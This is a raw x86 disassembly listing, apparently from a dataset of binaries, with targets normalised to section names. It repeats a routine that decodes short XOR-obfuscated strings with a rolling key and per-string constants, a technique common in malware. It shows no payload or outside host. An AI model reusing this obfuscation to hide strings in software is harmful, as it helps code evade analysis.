mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x4
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x9e
inc cl
mov [ ebp + eax - 0x60 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x60 ]
mov [ ebp - 0x5b ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x5
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x28
inc cl
mov [ ebp + eax - 0xf0 ] dl
movzx eax cl
cmp eax 0x7
jb r-xdata
lea eax [ ebp - 0xf0 ]
mov [ ebp - 0xe9 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xf0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x6
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x79
inc cl
mov [ ebp + eax - 0x78 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x78 ]
mov [ ebp - 0x73 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x7
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xa8
inc cl
mov [ ebp + eax - 0x28 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x8
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x67
inc cl
mov [ ebp + eax - 0xb0 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xb0 ]
mov [ ebp - 0xaa ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x9
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x74
inc cl
mov [ ebp + eax - 0x50 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x50 ]
mov [ ebp - 0x4b ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xa
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x24
inc cl
mov [ ebp + eax - 0x58 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x53 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xb
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x9c
inc cl
mov [ ebp + eax - 0xc0 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xc0 ]
mov [ ebp - 0xba ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xc
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xf3
inc cl
mov [ ebp + eax - 0x17c ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x17c ]
mov [ ebp - 0x17a ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x17c ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xd
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x87
inc cl
mov [ ebp + eax - 0x18 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xe
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x82
inc cl
mov [ ebp + eax - 0xd0 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
mov esi 0xf
lea eax [ ebp - 0xd0 ]
mov [ ebp - 0xca ] bl
mov [ ebp - 0x140 ] esi
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xd0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] esi
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
lea ebx [ ebx ]
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x8f
inc cl
mov [ ebp + eax - 0x20 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov esi 0x10
mov [ ebp - 0x4 ] esi
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] esi
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xda
inc cl
mov [ ebp + eax - 0x190 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x190 ]
mov [ ebp - 0x18e ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x190 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x11
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x71
inc cl
mov [ ebp + eax - 0x180 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x180 ]
mov [ ebp - 0x17e ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x180 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x12
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x3e
inc cl
mov [ ebp + eax - 0x188 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x188 ]
mov [ ebp - 0x186 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x188 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x13
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x59
inc cl
mov [ ebp + eax - 0x184 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x184 ]
mov [ ebp - 0x182 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x184 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x14
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x91
inc cl
mov [ ebp + eax - 0x30 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x15
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x82
inc cl
mov [ ebp + eax - 0x40 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x3c ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x16
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x69
inc cl
mov [ ebp + eax - 0x194 ] dl
movzx eax cl
cmp eax 0x3
jb r-xdata
lea eax [ ebp - 0x194 ]
mov [ ebp - 0x191 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x194 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x17
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x88
inc cl
mov [ ebp + eax - 0x18c ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x18c ]
mov [ ebp - 0x18a ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x18c ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x18
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0xb1
inc cl
mov [ ebp + eax - 0x68 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x68 ]
mov [ ebp - 0x63 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x68 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x19
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x69
inc cl
mov [ ebp + eax - 0xa8 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xa8 ]
mov [ ebp - 0xa2 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xa8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x1a
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0xf3
inc cl
mov [ ebp + eax - 0x38 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x34 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x1b
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x130 ]
mov eax 0x24
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x130 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
mov esi [ ebp - 0x174 ]
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1c
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xd8 ]
mov eax 0x3
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1d
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xe0 ]
mov eax 0x2e
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xe0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1e
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x178 ]
mov eax 0x1b
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x178 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1f
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x198 ]
mov eax 0x3e
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x198 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x20
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x1a0 ]
mov eax 0x30
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x1a0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x21
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x90 ]
mov eax 0x61
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x90 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x22
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x100 ]
mov eax 0x6
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x100 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x23
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x128 ]
mov eax 0x1a
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x128 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x24
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x1a8 ]
mov eax 0x38
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x1a8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x25
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x19c ]
mov eax 0x55
call sub_10070810
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
